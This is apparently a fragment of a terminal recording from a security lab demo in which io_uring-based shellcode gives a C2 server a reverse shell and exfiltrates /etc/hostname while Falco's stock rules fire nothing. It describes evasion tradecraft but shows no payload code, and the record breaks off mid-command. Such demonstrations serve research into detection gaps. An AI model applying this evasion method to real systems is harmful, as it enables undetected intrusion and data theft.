[84.499458, "o", "\u001b[?25l\u001b[2d$ \u001b[32mprintf\u001b[39m \u001b[33m\"     stock-rule rows: %s  ← unchanged, no new rows\\n\"\u001b[39m \u001b[33m\"\u001b[35m$(\u001b[32mdocker\u001b[39m logs flk \u001b[33m2>&\u001b[39m1 | \u001b[32mgrep\u001b[39m -c \u001b[33m\"No\u001b[39m\u001b[3;101H\u001b[1K\u001b[33m\rtice Redirect\"\u001b[35m)\u001b[33m\"\u001b[39m\u001b[4;101H\u001b[1K\r     stock-rule rows: 3  ← unchanged, no new rows\r\n$ \u001b[32mprintf\u001b[39m \u001b[33m'\\033[31m  ✘ NOT detected — socket/connect invisible; dup2 runs but its fd was born in io_ur\u001b[39m\u001b[6;101H\u001b[1K\u001b[33m\ring\\033[0m\\n'\u001b[31m\r\n  ✘ NOT detected — socket/connect invisible; dup2 runs but its fd was born in io_uring\u001b[39m\u001b[15X\r\n$ \u001b[32mprintf\u001b[39m \u001b[33m'\\033[31m    → no fd↔socket binding for falco → the stock rule stays silent (C2 got a full s\u001b[39m\u001b[9;101H\u001b[1K\u001b[33m\rhell anyway)\\033[0m\\n'\u001b[31m\r\n    → no fd↔socket binding for falco → the stock rule stays silent (C2 got a full shell anyway)\u001b[39m\u001b[6X\r\n$ \u001b[32mprintf\u001b[39m \u001b[33m'\\033[36m══ SCENARIO 3 — zero-exec (cbr_uring.bin): recv-driven exfil, no exec at all ══\\033\u001b[39m\u001b[12;101H\u001b[1K\u001b[33m\r[0m\\n'\u001b[36m\r\n══ SCENARIO 3 — zero-exec (cbr_uring.bin): recv-driven exfil, no exec at all ══\u001b[39m\u001b[22X\u001b[14;101H\u001b[1K\r$ \u001b[32mdocker\u001b[39m exec flk /lab/runner /lab/cbr_uring.bin\u001b[15;101H\u001b[1K\r[*] Loaded 1088 bytes from /lab/cbr_uring.bin\r\n[*] Config offsets found by scan: IP=1082 PORT=1086\u001b[50X\u001b[17;101H\u001b[1K\r[*] Shellcode at 0x751eccf53000 — executing...\r\n$ \u001b[32mprintf\u001b[39m \u001b[33m\"     stock-rule rows: %s  ← still nothing\\n\"\u001b[39m \u001b[33m\"\u001b[35m$(\u001b[32mdocker\u001b[39m logs flk \u001b[33m2>&\u001b[39m1 | \u001b[32mgrep\u001b[39m -c \u001b[33m\"Notice Redi\u001b[39m\u001b[19;101H\u001b[1K\u001b[33m\rrect\"\u001b[35m)\u001b[33m\"\u001b[39m\u001b[20;101H\u001b[1K\r     stock-rule rows: 3  ← still nothing\r\n$ \u001b[32mprintf\u001b[39m \u001b[33m'\\033[31m  ✘ NOT detected — and /etc/hostname landed at the C2 (bottom-left); clean exit\\033\u001b[39m\u001b[22;101H\u001b[1K\u001b[33m\r[0m\\n'\u001b[31m\r\n  ✘ NOT detected — and /etc/hostname landed at the C2 (bottom-left); clean exit\u001b[39m\u001b[22X\r\n$ \u001b[32mprintf\u001b[39m \u001b[33m'\\033[36m  TOTAL: the only rule-firings in the whole session were the 3 dup2 rows of the bas\u001b[39m\u001b[25;101H\u001b[1K\u001b[33m\reline.\\033[0m\\n'\u001b[36m\r\n  TOTAL: the only rule-firings in the whole session were the 3 dup2 rows of the baseline.\u001b[39m\u001b[12X\r\n$ printf '\\033[36m  every io_uring interaction surfaces as io_uring_setup/io_uring_enter — no sys_ent\u001b[28;101H\u001b[1K\u001b[?12l\u001b[?25h\u001b[39;1H"]
